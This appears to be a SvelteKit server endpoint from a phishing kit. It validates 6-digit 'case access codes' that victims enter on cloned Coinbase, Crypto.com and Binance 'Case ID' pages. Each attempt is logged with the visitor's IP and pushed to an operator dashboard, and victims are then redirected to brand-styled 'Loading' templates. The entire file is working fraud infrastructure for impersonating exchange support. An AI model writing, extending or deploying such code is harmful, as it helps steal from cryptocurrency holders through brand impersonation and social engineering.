/**
 * Visitor case-access-code validation.
 *
 * The captured Case ID pages (Coinbase, CDC, Binance) collect 6 digits from
 * the visitor. When all 6 are entered, the page POSTs them here. We match
 * against the admin's `case_codes` table. On success the page is redirected
 * to either the code's configured target or the brand's Loading page.
 *
 * Public endpoint — visitor pages must call it without auth.
 */
import { json, type RequestHandler } from '@sveltejs/kit';
import { dbGetCaseCodeByCode, dbRecordCaseCodeUse } from '$lib/server/database.js';
import { serverState } from '$lib/server/state';
import { broadcast } from '$lib/server/websocket';

const BRAND_DEFAULT_LANDING: Record<string, string> = {
	Coinbase: '/templates/preview/Coinbase/Loading',
	CDC: '/templates/preview/CDC/Loading',
	Binance: '/templates/preview/Binance/Loading'
};

export const POST: RequestHandler = async ({ request, getClientAddress }) => {
	let body: { code?: string; brand?: string } = {};
	try {
		body = await request.json();
	} catch {
		return json({ ok: false, error: 'invalid json' }, { status: 400 });
	}

	const raw = String(body.code ?? '').replace(/\D/g, '');
	const brand = String(body.brand ?? '').trim();
	if (raw.length !== 6) {
		return json({ ok: false, valid: false, error: 'code must be 6 digits' }, { status: 400 });
	}

	const ip = getClientAddress() || '';
	const record = dbGetCaseCodeByCode(raw);

	if (!record || !record.active) {
		const entry = serverState.addLogEntry(
			`visitor ${ip} entered invalid case code on ${brand || 'unknown'} case page`,
			'alert'
		);
		try {
			broadcast({ type: 'log:new', payload: entry });
		} catch {}
		return json({ ok: true, valid: false });
	}

	if (record.expiresAt && record.expiresAt > 0 && record.expiresAt < Date.now()) {
		return json({ ok: true, valid: false, error: 'expired' });
	}

	dbRecordCaseCodeUse(raw, ip);

	const target = record.targetPage?.trim() || BRAND_DEFAULT_LANDING[brand] || '';
	const labelSuffix = record.label ? ` (${record.label})` : '';
	const entry = serverState.addLogEntry(
		`visitor ${ip} entered valid case code on ${brand || record.module || 'case'} page${labelSuffix}`,
		'action'
	);
	try {
		broadcast({ type: 'log:new', payload: entry });
	} catch {}

	return json({ ok: true, valid: true, targetPage: target });
};
